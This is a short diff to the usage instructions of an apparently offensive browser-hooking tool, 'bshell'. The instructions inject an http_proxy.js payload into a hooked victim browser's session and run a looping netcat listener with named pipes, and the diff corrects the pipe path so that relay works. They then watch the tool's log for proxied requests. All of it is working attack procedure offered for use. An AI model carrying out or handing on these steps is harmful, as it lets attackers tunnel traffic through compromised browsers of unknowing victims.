@@ -9,7 +9,7 @@ Inject the hooked browser with the http_proxy plugin:
 [root bshell]# cp plugins/http_proxy/http_proxy.js payloads/{sessionid}/
 
 In one terminal, run:
-[root bshell]# while true; do echo `date`; rm -f /tmp/ncfifo? ; mkfifo /tmp/ncfifo1 ; mkfifo /tmp/ncfifo2; nc -nvk -l 32455 >/tmp/ncfifo1 <ncfifo/tmp/2; sleep 1; done
+[root bshell]# while true; do echo `date`; rm -f /tmp/ncfifo? ; mkfifo /tmp/ncfifo1 ; mkfifo /tmp/ncfifo2; nc -nvk -l 32455 >/tmp/ncfifo1 </tmp/ncfifo2; sleep 1; done
 
 In another terminal, run:
 [root bshell]# tail -f bshell.log | grep 'proxy => '&
